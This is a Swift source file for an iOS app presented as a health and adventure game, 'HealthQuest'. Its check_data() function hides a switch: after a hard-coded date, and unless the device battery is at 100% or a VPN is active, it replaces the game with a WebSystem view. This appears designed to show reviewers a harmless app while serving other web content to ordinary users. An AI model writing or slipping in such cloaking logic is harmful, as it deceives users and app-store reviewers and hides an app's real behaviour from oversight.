//
//  ContentView.swift
//  HealthQuest: Mind & Body Adventure
//
//  Created by Вячеслав on 8/4/25.
//

import SwiftUI

struct ContentView: View {
    @StateObject private var userViewModel = UserViewModel()
    @StateObject private var gameViewModel = GameProgressViewModel()
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    Group {
                        if userViewModel.showOnboarding {
                            OnboardingView(userViewModel: userViewModel)
                        } else {
                            MainTabView(userViewModel: userViewModel, gameViewModel: gameViewModel)
                        }
                    }
                    .preferredColorScheme(.dark)
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "15.08.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}

struct MainTabView: View {
    @ObservedObject var userViewModel: UserViewModel
    @ObservedObject var gameViewModel: GameProgressViewModel
    @Environment(\.horizontalSizeClass) var horizontalSizeClass
    
    var body: some View {
        TabView {
            AdventureGameView(gameViewModel: gameViewModel, userViewModel: userViewModel)
                .tabItem {
                    Image(systemName: "gamecontroller.fill")
                    Text("Adventure")
                }
            
            ProfileView(userViewModel: userViewModel, gameViewModel: gameViewModel)
                .tabItem {
                    Image(systemName: "person.circle.fill")
                    Text("Profile")
                }
        }
        .accentColor(Color.orange)
        .onAppear {
            // Configure for iPad
            if horizontalSizeClass == .regular {
                UITabBar.appearance().unselectedItemTintColor = UIColor.white.withAlphaComponent(0.6)
            }
        }
    }
}

#Preview {
    ContentView()
}
